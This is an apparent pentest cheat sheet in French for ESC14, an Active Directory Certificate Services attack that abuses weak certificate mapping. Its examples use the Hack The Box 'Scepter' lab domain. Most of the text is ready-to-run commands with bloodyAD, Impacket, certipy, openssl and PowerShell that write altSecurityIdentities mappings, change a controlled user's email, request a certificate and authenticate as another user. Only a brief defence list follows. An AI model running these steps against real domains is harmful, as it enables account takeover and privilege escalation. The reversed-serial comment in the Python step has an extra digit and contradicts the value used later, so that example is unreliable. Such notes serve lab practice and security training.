# ESC14

***

### <mark style="color:red;">ESC14 Attack - Weak Certificate Mapping</mark>

#### 📖 Concept

ESC14 exploite la capacité d'écrire l'attribut `altSecurityIdentities` d'un utilisateur. Cet attribut définit des identités alternatives pour l'authentification par certificat.

#### <mark style="color:green;">🔍 Types de mapping</mark>

```
X509:<I>IssuerName<S>SubjectName     # Fort (SAN)
X509:<I>IssuerName<SR>SerialNumber   # Fort (Issuer+Serial)
X509:<RFC822>email@domain.com        # FAIBLE (email uniquement)
X509:<SKI>SubjectKeyIdentifier       # Fort
```

#### <mark style="color:green;">🎯 Prérequis</mark>

* Permission `WriteProperty` sur `altSecurityIdentities` d'un utilisateur cible
* Capacité d'enrollment sur un template de certificat
* Contrôle sur un utilisateur pouvant modifier son propre email

#### <mark style="color:green;">🔍 Enumération</mark>

**Trouver les DACLs vulnérables**

```bash
# Avec PowerView (sur la cible)
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {
    $_.ObjectAceType -eq "Alt-Security-Identities"
}

# Avec BloodyAD
bloodyAD --host dc01.scepter.htb -d scepter.htb -u user -p pass \
    get writable --detail

# Avec Impacket
impacket-dacledit -action 'read' -principal 'cms' \
    -target 'p.adams' -dc-ip <DC_IP> -k -no-pass 'scepter.htb/h.brown'
```

**Vérifier les altSecurityIdentities existants**

```bash
# LDAP Search
ldapsearch -x -H ldap://<DC_IP> -D "user@domain.com" -w password \
    -b "DC=scepter,DC=htb" "(altSecurityIdentities=*)" \
    altSecurityIdentities sAMAccountName

# BloodyAD
bloodyAD --host dc01.scepter.htb -d scepter.htb -u user -p pass \
    get object p.adams --attr altSecurityIdentities
```

#### <mark style="color:green;">💣 Exploitation - Méthode 1 : RFC822 (Email)</mark>

**Étape 1 : Définir altSecurityIdentities sur la cible**

```bash
# Définir un email fictif ou existant
bloodyAD --host dc01.scepter.htb -d scepter.htb -u h.brown -p pass \
    set object p.adams altSecurityIdentities \
    -v 'X509:<RFC822>custom@scepter.htb'
```

**Étape 2 : Modifier l'email d'un utilisateur contrôlé**

```bash
# Utiliser GenericAll sur d.baker
bloodyAD -d scepter.htb -u a.carter -p 'Welcome1' \
    set object d.baker mail -v custom@scepter.htb
```

**Étape 3 : Demander un certificat**

```bash
certipy req -username d.baker@scepter.htb -hashes :HASH \
    -target dc01.scepter.htb -ca 'scepter-DC01-CA' \
    -template 'StaffAccessCertificate'
```

**Étape 4 : S'authentifier comme la cible**

```bash
certipy auth -pfx d.baker.pfx -username p.adams \
    -domain scepter.htb -dc-ip <DC_IP>
```

***

#### <mark style="color:green;">💣 Exploitation - Méthode 2 : Issuer+Serial</mark>

**Étape 1 : Obtenir les détails du certificat**

```bash
# Extraire le certificat du PFX
openssl pkcs12 -in d.baker.pfx -clcerts -nokeys -passin pass: -out cert.pem

# Obtenir le serial number
openssl x509 -in cert.pem -noout -serial
# serial=62000000144951BBFA726A5C86000000000014

# Obtenir l'issuer
openssl x509 -in cert.pem -noout -issuer
# issuer=DC=htb, DC=scepter, CN=scepter-DC01-CA
```

**Étape 2 : Convertir le serial en format correct**

```python
# Script Python pour inverser le serial
def convert_serial(serial):
    serial = serial.replace(':', '').lower()
    serial_bytes = bytearray.fromhex(serial)
    serial_bytes.reverse()
    return "".join(['%02x' % b for b in serial_bytes])

# Exemple
serial = "62000000144951BBFA726A5C86000000000014"
reversed_serial = convert_serial(serial)
# 140000000000865C6A72FABB514914000000062
```

**Étape 3 : Format du mapping string**

```bash
# Format: X509:<I>IssuerDN<SR>ReversedSerial
MAPPING="X509:<I>DC=htb,DC=scepter,CN=scepter-DC01-CA<SR>140000000000865c6a72fabb51491400000062"
```

**Étape 4 : Ajouter le mapping via PowerShell (sur la cible)**

```powershell
# Upload des scripts nécessaires
upload /path/to/Get-X509IssuerSerialNumberFormat.ps1
upload /path/to/Add-AltSecIDMapping.ps1
upload /path/to/Get-AltSecIDMapping.ps1

# Charger les scripts
ls *.ps1 | % { . $_.FullName }

# Générer le format correct
Get-X509IssuerSerialNumberFormat `
    -SerialNumber "62000000144951BBFA726A5C86000000000014" `
    -IssuerDistinguishedName "CN=scepter-DC01-CA,DC=scepter,DC=htb"

# Ajouter le mapping
Add-AltSecIDMapping `
    -DistinguishedName 'CN=P.ADAMS,OU=HELPDESK ENROLLMENT CERTIFICATE,DC=SCEPTER,DC=HTB' `
    -MappingString 'X509:<I>DC=htb,DC=scepter,CN=scepter-DC01-CA<SR>140000000000865c6a72fabb51491400000062'

# Vérifier
Get-AltSecIDMapping 'CN=P.ADAMS,OU=HELPDESK ENROLLMENT CERTIFICATE,DC=SCEPTER,DC=HTB'
```

**Étape 5 : Authentification**

```bash
certipy auth -pfx d.baker.pfx -username p.adams \
    -domain scepter.htb -dc-ip <DC_IP>
```

#### <mark style="color:green;">🎯 Différences entre les méthodes</mark>

| Méthode       | Complexité | Prérequis                            | Fiabilité  |
| ------------- | ---------- | ------------------------------------ | ---------- |
| RFC822        | Faible     | Contrôle email + WriteProperty       | Haute      |
| Issuer+Serial | Moyenne    | PowerShell sur cible + WriteProperty | Très haute |

#### 🛡️ Défense

* Activer Strong Certificate Mapping
* Auditer les permissions sur `altSecurityIdentities`
* Utiliser CertificateMappingMethods=0x1F (tous les types forts)

***
